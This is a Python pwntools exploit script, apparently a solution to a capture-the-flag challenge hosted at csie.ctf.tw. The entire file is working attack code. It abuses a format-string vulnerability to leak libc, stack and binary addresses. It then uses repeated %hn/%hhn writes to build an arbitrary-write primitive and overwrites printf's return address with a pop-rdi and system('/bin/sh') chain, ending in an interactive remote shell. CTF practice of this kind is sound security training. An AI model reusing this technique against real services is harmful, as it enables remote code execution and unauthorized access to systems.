from math import floor
from pwn import *

context.arch = 'amd64'

host = 'csie.ctf.tw'
port = 10136
# host = '127.0.0.1'
# port = 8888
r = remote(host, port)

debug = True if host == '127.0.0.1' else False
def debug_input(msg):
    global debug
    if debug:
        input(msg)

debug_input('Press Enter to continue.')

idx_libc_csu_init = 8
idx_libc_start_main_240 = 9
idx_and_argv = 11
idx_argv = idx_and_argv + 0xd*2

__libc_start_main_off = 0x0000000000020740
system_off = 0x0000000000045390
execve_off = 0x00000000000cc770

# leak memory & stack address
r.recvuntil(':')
payload = '%' + str(idx_libc_start_main_240) + '$p'
payload += '%' + str(idx_and_argv) + '$p'
payload += '%' + str(idx_libc_csu_init) + '$p'
payload += 'x'
payload = payload.encode()
r.sendline(payload)

# leak libc address
r.recvuntil('0x')
__libc_start_main_240 = int(r.recvuntil('0x')[:-2], 16)
__libc_start_main = __libc_start_main_240 - 240
libc = __libc_start_main - __libc_start_main_off

# calculate system address
system = system_off + libc
bin_sh = system + 0x7f9deb9ddd17 - 0x7f9deb896390
print('system        =', hex(system))
print('/bin/sh       =', hex(bin_sh))

# leak argv address on stack
argv = int(r.recvuntil('0x')[:-2], 16)
print('argv          =', hex(argv))

# calculate iter on stack
iter_i = argv - (0x7fff9bf081b8 - 0x7fff9bf080c8) + 4
vfprintf_ret = argv + 0x7ffd77a08cf8 - 0x7ffd77a08ed8
printf_ret = vfprintf_ret + 0x7ffc71bca058 - 0x7ffc71bc9f78
print('iter_i        =', hex(iter_i))
print('printf_ret    =', hex(printf_ret))

# leak buf address
__libc_csu_init = int(r.recvuntil('x')[:-1], 16)
pop_rdi = __libc_csu_init + 99
buf = __libc_csu_init + (0x555555755020 - 0x555555554a80)
print('pop_rdi       =', hex(pop_rdi))
print('buf           =', hex(buf))

# leak argv_0 address
payload = '%' + str(idx_argv) + '$p'
payload = payload.encode().ljust(0x10, b'z')
r.recvuntil(':')
r.send(payload)
origin_argv_0 = int(r.recvuntil('z')[:-1], 16)
origin_idx_argv_0 = idx_argv+(origin_argv_0 - argv)//0x8

# pic a argv_0
argv_0 = argv + 0x8
idx_argv_0 = idx_argv + 1

# pick argvs[0 ~ argv_num]
argvs = [argv_0, argv_0+0x8*2]
idx_argvs = [idx_argv_0, idx_argv_0+2]
print('argvs[0]      =', hex(argvs[0]))
print('argvs[1]      =', hex(argvs[1]))

fmt_recvn = 0
def fmt(prev, val, idx, byte):
    global fmt_recvn
    if byte == 1:
        prev &= 0xff
        full = 0x100
        hn_hnn = '$hhn'
    elif byte == 2:
        prev &= 0xffff
        full = 0x10000
        hn_hnn = '$hn'
    ret = ''
    if val > prev:
        ret = '%' + str(val - prev) + 'c'
        fmt_recvn += val - prev
    elif val < prev:
        ret = '%' + str(full + val - prev) + 'c'
        fmt_recvn += full + val - prev
    ret += '%' + str(idx) + hn_hnn
    return ret.encode()

def fmt_send_recv(val, idx, byte):
    payload = fmt(0, val, idx, byte)
    if len(payload) < 0x10:
        payload = payload.ljust(0x10, b'\x00')
    r.recvuntil(':')
    r.send(payload)
    r.recvn(val)

def fmt_make_new_addr(stack_addr, val):
    """Write val to stack_addr.
    Note: stack_addr should be able to be touched by %*$p.
    """
    global idx_argv
    global idx_and_argv

    fmt_send_recv(stack_addr & 0xff, idx_and_argv, 1)
    fmt_send_recv(val & 0xffff, idx_argv, 2)

    fmt_send_recv((stack_addr+0x2) & 0xff, idx_and_argv, 1)
    fmt_send_recv((val>>0x10) & 0xffff, idx_argv, 2)

    fmt_send_recv((stack_addr+0x4) & 0xff, idx_and_argv, 1)
    fmt_send_recv((val>>0x20) & 0xffff, idx_argv, 2)

    fmt_send_recv((stack_addr+0x6) & 0xff, idx_and_argv, 1)
    fmt_send_recv((val>>0x30) & 0xffff, idx_argv, 2)

    fmt_send_recv(stack_addr & 0xff, idx_and_argv, 1)

# make more loop
# TODO: make this more robust by overwriting more bytes
debug_input('Make more loop.')
fmt_send_recv(iter_i&0xffff, idx_and_argv, 2)
fmt_send_recv(0xffff, idx_argv, 2)

fmt_send_recv(argv_0&0xffff, idx_and_argv, 2)

def fmt_write_to_addr(addr, val):
    """Write val to addr.
    implementation:
        Make addr on stack, and write val to that addr.
    """
    global idx_argv_0

    fmt_make_new_addr(argv_0, addr)
    fmt_send_recv(val & 0xff, idx_argv_0, 1)

    for i in range(1, 8):
        fmt_send_recv((addr+i) & 0xff, idx_argv, 1)
        fmt_send_recv((val>>(0x8*i)) & 0xff, idx_argv_0, 1)

debug_input('Write system.')
fmt_write_to_addr(printf_ret+0x10, system)
debug_input('Write &"/bin/sh".')
fmt_write_to_addr(printf_ret+0x8, bin_sh)

# Create payload to write pop_rdi and fix system.
fmt_recvn = 0
final_payload = fmt(0, pop_rdi&0xff, idx_argvs[0], 1)
final_payload += fmt(pop_rdi&0xff, (system>>4*0x8)&0xffff, idx_argvs[1], 2)
final_recvn = fmt_recvn
print(len(final_payload))
final_payload = final_payload.ljust(floor((len(final_payload)-1)/8+1)*8, b'\x00')
print(final_payload)
print(len(final_payload))

# Write final_payload[0x10:] to buf+0x10.
debug_input('Write final_payload[0x10:] to buf+0x10.')
for i in range(0x10, len(final_payload), 0x8):
    fmt_write_to_addr(buf+i, u64(final_payload[i:i+0x8]))

# Write addresses to argvs[].
debug_input('Write addresses to argvs[].')
fmt_make_new_addr(argvs[1], printf_ret+0x10+0x4)
fmt_make_new_addr(argvs[0], printf_ret)

# Send final_payload[:0x10].
debug_input('Send final_payload[:0x10].')
r.recvuntil(':')
r.send(final_payload[:0x10])

# Receive a lot of blank.
r.recvn(final_recvn)

r.interactive()
